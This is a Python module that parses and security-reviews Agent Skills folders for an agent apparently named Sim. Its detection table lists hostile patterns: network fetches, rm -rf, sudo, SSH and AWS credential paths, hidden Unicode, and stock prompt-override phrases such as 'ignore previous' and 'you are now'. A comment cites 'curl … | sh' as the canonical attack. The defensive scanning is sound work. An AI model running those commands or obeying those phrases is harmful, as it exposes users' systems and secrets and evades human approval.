"""Agent Skills: parse `SKILL.md` folders (docs/plans/agent-skills-design.md).

The open Agent Skills format: a skill is a folder holding `SKILL.md` --
YAML frontmatter with at least `name` and `description`, then Markdown
instructions -- plus any scripts or reference files it bundles. Only the
name and description ride in every task (`catalog_text`); the body is read
when a task asks for the skill (`load_body`).

Pure and stdlib-only, like the rest of `contracts`: PyYAML is used when it
is installed, and a small reader covers the frontmatter skills actually use
(scalars, quoted strings, inline `[a, b]` lists and `- item` lists).
"""

from __future__ import annotations

import hashlib
import re
from dataclasses import dataclass, field
from pathlib import Path

NAME_RE = re.compile(r"^[a-z0-9](?:[a-z0-9-]{0,62}[a-z0-9])?$")
MAX_DESCRIPTION = 1024
MAX_BODY_CHARS = 12_000


@dataclass(frozen=True)
class SkillCard:
    name: str
    description: str
    source: str
    path: Path
    allowed_profiles: tuple[str, ...] = ()
    sha256: str = ""
    meta: dict = field(default_factory=dict, compare=False)


@dataclass(frozen=True)
class InvalidSkill:
    path: Path
    reason: str


def _scalar(value: str):
    value = value.strip()
    if len(value) >= 2 and value[0] == value[-1] and value[0] in "'\"":
        return value[1:-1]
    if value.startswith("[") and value.endswith("]"):
        return [_scalar(v) for v in value[1:-1].split(",") if v.strip()]
    return value


def _read_frontmatter(text: str) -> dict:
    try:
        import yaml  # optional third party

        data = yaml.safe_load(text)
        return data if isinstance(data, dict) else {}
    except ImportError:
        pass
    except Exception:  # noqa: BLE001 -- malformed YAML: fall back to the simple reader
        pass
    data: dict = {}
    key = None
    for raw in text.splitlines():
        if not raw.strip() or raw.lstrip().startswith("#"):
            continue
        item = re.match(r"^\s+-\s+(.*)$", raw)
        if item and key is not None:
            if not isinstance(data.get(key), list):
                data[key] = []
            data[key].append(_scalar(item.group(1)))
            continue
        pair = re.match(r"^([A-Za-z0-9_-]+):\s*(.*)$", raw)
        if pair:
            key = pair.group(1)
            data[key] = _scalar(pair.group(2)) if pair.group(2).strip() else []
    return data


def split_frontmatter(text: str) -> tuple[dict, str] | None:
    """`(frontmatter, body)`, or None when the file does not open with a
    `---` block."""
    match = re.match(r"^﻿?---\s*\n(.*?)\n---\s*(?:\n|$)(.*)$", text, re.S)
    if not match:
        return None
    return _read_frontmatter(match.group(1)), match.group(2)


def parse_skill(skill_md: Path, *, source: str) -> SkillCard | InvalidSkill:
    try:
        raw = skill_md.read_bytes()
    except OSError as exc:
        return InvalidSkill(skill_md, f"unreadable: {exc}")
    text = raw.decode("utf-8", errors="replace")
    parts = split_frontmatter(text)
    if parts is None:
        return InvalidSkill(skill_md, "no frontmatter: SKILL.md must open with a --- block")
    front, _body = parts
    name = str(front.get("name") or "").strip()
    description = " ".join(str(front.get("description") or "").split())
    if not NAME_RE.match(name):
        return InvalidSkill(skill_md, f"invalid name {name!r}: lowercase letters, digits and hyphens, at most 64")
    if not description:
        return InvalidSkill(skill_md, "missing description")
    if len(description) > MAX_DESCRIPTION:
        return InvalidSkill(skill_md, f"description longer than {MAX_DESCRIPTION} characters")
    profiles = front.get("allowed_profiles") or front.get("allowed-profiles") or ()
    if isinstance(profiles, str):
        profiles = [p.strip() for p in profiles.split(",") if p.strip()]
    return SkillCard(
        name=name, description=description, source=source, path=skill_md.parent,
        allowed_profiles=tuple(str(p) for p in profiles), sha256=hashlib.sha256(raw).hexdigest(),
        meta={k: v for k, v in front.items() if k not in ("name", "description")},
    )


def discover_skills(roots: list[tuple[str, Path]]) -> tuple[list[SkillCard], list[InvalidSkill]]:
    """Every `SKILL.md` under each `(source, root)`, first root winning a
    name clash. Invalid skills are returned with a reason, never raised."""
    cards: dict[str, SkillCard] = {}
    invalid: list[InvalidSkill] = []
    for source, root in roots:
        root = Path(root).expanduser()
        if not root.is_dir():
            continue
        for skill_md in sorted(root.rglob("SKILL.md")):
            parsed = parse_skill(skill_md, source=source)
            if isinstance(parsed, InvalidSkill):
                invalid.append(parsed)
            elif parsed.name in cards:
                invalid.append(InvalidSkill(skill_md, f"duplicate name {parsed.name!r}; {cards[parsed.name].path} is used"))
            else:
                cards[parsed.name] = parsed
    return sorted(cards.values(), key=lambda c: c.name), invalid


#: Files Sim may actually execute.
_SCRIPT_SUFFIXES: tuple[str, ...] = (".py", ".sh", ".js", ".rb", ".pl", ".ps1", ".bat")
#: Labels that block wherever they appear, including in a reference
#: document: instructions aimed at Sim's rules, and text hidden from the
#: person reading the file, are never innocent context.
_ALWAYS_BLOCKING: frozenset = frozenset({"overrides Sim's rules", "hidden text", "unreadable", "too big to read"})

#: What a skill may not quietly do. Each is a (label, pattern) pair; the
#: reviewer reports every match with the file and line, so a person reads
#: the actual words rather than a verdict.
_FLAGS: tuple[tuple[str, "re.Pattern[str]"], ...] = (
    # Each pattern earns its looseness. Measured against the 20 skills in
    # anthropics/skills (2026-09-15): the first versions matched `import
    # urllib.parse` (string parsing, not a socket), every `total_tokens`
    # in a benchmark script, and the word "password" in prose explaining
    # `qpdf --password`. 13 of skill-creator's 13 "findings" were
    # arithmetic. A reviewer that flags everything is read by nobody.
    # `curl` and `wget` keep their bare form: `curl https://x/y.sh | sh` is
    # the canonical attack and carries no flag. Requiring one missed it, and
    # the test fixture caught that. Prose that merely mentions curl is a
    # note now, so the looser pattern costs nothing.
    ("network", re.compile(r"\b(?:curl\s|wget\s|urllib\.request|urlopen\(|requests\.(?:get|post|put|delete)"
                           r"|httpx\.|socket\.socket|fetch\()", re.I)),
    ("destructive", re.compile(r"\brm\s+-rf\b|\bgit\s+push\b|\bchmod\s+[0-7]{3}\b|\bsudo\b|\bmkfs\b|>\s*/dev/sd", re.I)),
    # Case-sensitive on purpose: `API_KEY` is a credential, `api_keys` in a
    # sentence is not, and `tokens` is usually a count of words.
    ("credentials", re.compile(r"\bAPI[_-]?KEY\b|\bACCESS[_-]?TOKEN\b|\bAUTH[_-]?TOKEN\b|\bSECRET[_-]?KEY\b"
                               r"|\bPASSWORD\s*[=:]|\bBearer\s+[A-Za-z0-9._-]{8,}|\.ssh/|id_rsa|~/\.aws|environ\[")),
    # A skill is instructions, and instructions that argue with Sim's own
    # rules are the attack this format invites (arxiv 2604.02837).
    ("overrides Sim's rules", re.compile(
        r"\b(?:ignore (?:all )?(?:previous|prior|above)|disregard (?:the )?(?:rules|instructions)|"
        r"you are now|do not tell (?:the )?(?:user|creator|human)|"
        # A bare "bypass" caught "if you bypass the SDK" in ordinary prose;
        # it counts when it is a rule, a person or an approval being bypassed.
        r"(?:without asking|bypass(?:ing)?|skip(?:ping)?)\s+(?:the\s+)?"
        r"(?:user|creator|human|approval|confirmation|permission|guard\w*|safety|rules?|checks?)|"
        r"no need to (?:ask|confirm)|skip (?:the )?(?:approval|confirmation))\b", re.I)),
    ("hidden text", re.compile(r"[\u200b-\u200f\u2028-\u202e\ufeff]")),
)
#: Orgs whose skills install without a person approving each one (the
#: creator, 2026-09-15: "agree with skill trust strategy"). Trust belongs to
#: the organisation that maintains a repository, never to a directory that
#: lists it -- a marketplace entry counts only if it lives in one of these.
#: The deterministic review still runs; a flagged skill still waits.
TRUSTED_ORGS: tuple[str, ...] = ("anthropics", "google", "microsoft", "huggingface", "trailofbits")


@dataclass(frozen=True)
class Source:
    """Where a skill came from: `github.com/google/skills#skills/bigquery`."""

    host: str
    org: str
    repo: str
    path: str = ""
    ref: str = ""

    @property
    def trusted(self) -> bool:
        return self.host == "github.com" and self.org.lower() in TRUSTED_ORGS

    @property
    def name(self) -> str:
        return f"{self.org}/{self.repo}"


_GIT_URL = re.compile(
    r"^(?:https?://|git@)?(?P<host>[a-z0-9.\-]+)[/:](?P<org>[A-Za-z0-9_.\-]+)/(?P<repo>[A-Za-z0-9_.\-]+?)"
    r"(?:\.git)?(?:#(?P<path>[^@\s]*))?(?:@(?P<ref>[^\s]+))?$", re.I)


def parse_source(url: str) -> Source | None:
    """`github.com/google/skills#skills/gmail@abc123` -> a `Source`."""
    match = _GIT_URL.match((url or "").strip())
    if not match:
        return None
    return Source(host=match.group("host").lower(), org=match.group("org"), repo=match.group("repo"),
                  path=(match.group("path") or "").strip("/"), ref=(match.group("ref") or ""))


#: A licence file next to the skill, or in the repository it came from.
_LICENCE_FILES = ("LICENSE", "LICENSE.txt", "LICENSE.md", "LICENCE", "COPYING", "NOTICE")
_OPEN_LICENCES = ("apache license", "mit license", "bsd ", "mozilla public license", "isc license",
                  "gnu general public", "gnu lesser general public", "the unlicense", "cc0 ")


@dataclass(frozen=True)
class Finding:
    label: str
    path: str        # relative to the skill folder
    line: int
    text: str        # the line itself, trimmed
    # In a script Sim may run, or in SKILL.md -- the instructions Sim
    # actually follows. Those two ARE the skill; every other file is
    # reference material a person may read and Sim never executes.
    decisive: bool = False


@dataclass(frozen=True)
class Review:
    """What a skill contains, before anyone decides to trust it."""

    name: str
    licence: str                      # the licence named in a LICENSE file, or ""
    open_licence: bool                # that licence is a recognised open one
    scripts: tuple[str, ...] = ()     # paths of executable/code files it ships
    findings: tuple[Finding, ...] = ()
    files: int = 0
    bytes_: int = 0

    @staticmethod
    def _blocks(finding: Finding) -> bool:
        return finding.decisive or finding.label in _ALWAYS_BLOCKING

    @property
    def blocking(self) -> tuple[Finding, ...]:
        """What must be read before this skill is enabled."""
        return tuple(f for f in self.findings if self._blocks(f))

    @property
    def notes(self) -> tuple[Finding, ...]:
        """Worth knowing, not worth blocking on: a `curl` in a reference
        document is an example, not something Sim will run."""
        return tuple(f for f in self.findings if not self._blocks(f))

    @property
    def clean(self) -> bool:
        """Nothing blocking. Not "nothing matched": every real skill
        mentions a password or a request somewhere in its documentation,
        and a review that is never clean enables nothing, ever."""
        return not self.blocking


def _licence_of(folder: Path) -> tuple[str, bool]:
    for name in _LICENCE_FILES:
        path = folder / name
        if not path.is_file():
            continue
        head = path.read_text(encoding="utf-8", errors="replace")[:400]
        first = " ".join(head.split())[:120]
        low = head.lower()
        return first, any(token in low for token in _OPEN_LICENCES)
    return "", False


def review_skill(folder: Path, *, max_bytes: int = 2_000_000) -> Review:
    """Read every file of a skill and say what is in it.

    Deterministic and pure: no model, no network, no execution. It reports;
    a person (or a trusted source, §3.9 of the design) decides."""
    folder = Path(folder)
    card = parse_skill(folder / "SKILL.md", source="review")
    name = card.name if isinstance(card, SkillCard) else folder.name
    licence, is_open = _licence_of(folder)
    scripts: list[str] = []
    findings: list[Finding] = []
    files = 0
    total = 0
    for path in sorted(p for p in folder.rglob("*") if p.is_file()):
        rel = str(path.relative_to(folder))
        files += 1
        try:
            total += path.stat().st_size
        except OSError:
            pass
        is_script = path.suffix.lower() in _SCRIPT_SUFFIXES or bool(path.stat().st_mode & 0o111)
        if is_script:
            scripts.append(rel)
        # SKILL.md is not a script, and it is not documentation either: it is
        # the instruction Sim follows. A "curl this and run it" there is the
        # attack this format invites, not an example.
        decisive = is_script or rel == "SKILL.md"
        if total > max_bytes:
            findings.append(Finding("too big to read", rel, 0, f"stopped after {max_bytes} bytes", True))
            break
        try:
            text = path.read_text(encoding="utf-8", errors="replace")
        except OSError as exc:
            findings.append(Finding("unreadable", rel, 0, str(exc), True))
            continue
        for number, line in enumerate(text.splitlines(), start=1):
            if number == 1:
                # A UTF-8 byte-order mark opens half the XML schemas in the
                # world; it is a file-encoding marker, not text hidden from
                # a reader.
                line = line.lstrip("\ufeff")
            for label, pattern in _FLAGS:
                if pattern.search(line):
                    findings.append(Finding(label, rel, number, " ".join(line.split())[:160], decisive))
    return Review(name=name, licence=licence, open_licence=is_open, scripts=tuple(scripts),
                  findings=tuple(findings), files=files, bytes_=total)


def review_text(review: Review) -> str:
    """The review as a person reads it before approving."""
    lines = [f"{review.name}: {review.files} file(s), {review.bytes_} bytes",
             f"licence: {review.licence or 'NONE FOUND'}" + (" (open)" if review.open_licence else "")]
    if review.scripts:
        lines.append(f"scripts: {', '.join(review.scripts)}")
    if not review.findings:
        lines.append("nothing flagged")
        return "\n".join(lines)
    blocking, notes = review.blocking, review.notes
    if blocking:
        lines.append(f"{len(blocking)} thing(s) to look at:")
        for finding in blocking[:40]:
            where = f"{finding.path}:{finding.line}" if finding.line else finding.path
            lines.append(f"  [{finding.label}] {where}  {finding.text}")
        if len(blocking) > 40:
            lines.append(f"  ... and {len(blocking) - 40} more")
    else:
        lines.append("nothing blocking")
    if notes:
        lines.append(f"{len(notes)} mention(s) in documentation, not in what Sim runs:")
        for finding in notes[:10]:
            where = f"{finding.path}:{finding.line}" if finding.line else finding.path
            lines.append(f"  [{finding.label}] {where}  {finding.text}")
        if len(notes) > 10:
            lines.append(f"  ... and {len(notes) - 10} more")
    return "\n".join(lines)


def catalog_text(cards: list[SkillCard], *, profile: str = "", max_chars: int = 3000) -> str:
    """The skills a task may ask for, one line each, within `max_chars`."""
    lines: list[str] = []
    used = 0
    for card in cards:
        if card.allowed_profiles and profile and profile not in card.allowed_profiles:
            continue
        line = f"- {card.name}: {card.description}"
        if used + len(line) + 1 > max_chars:
            lines.append(f"- ... ({len(cards) - len(lines)} more not listed)")
            break
        lines.append(line)
        used += len(line) + 1
    return "\n".join(lines)


def load_body(card: SkillCard, *, max_chars: int = MAX_BODY_CHARS) -> str:
    """The skill's instructions (the Markdown after its frontmatter)."""
    parts = split_frontmatter((card.path / "SKILL.md").read_text(encoding="utf-8", errors="replace"))
    body = (parts[1] if parts else "").strip()
    return body if len(body) <= max_chars else body[:max_chars] + "\n\n[... cut; read the rest of SKILL.md with read_file]"


__all__ = ["Finding", "InvalidSkill", "Review", "SkillCard", "Source", "TRUSTED_ORGS", "catalog_text",
           "discover_skills", "load_body", "parse_skill", "parse_source", "review_skill", "review_text",
           "split_frontmatter"]
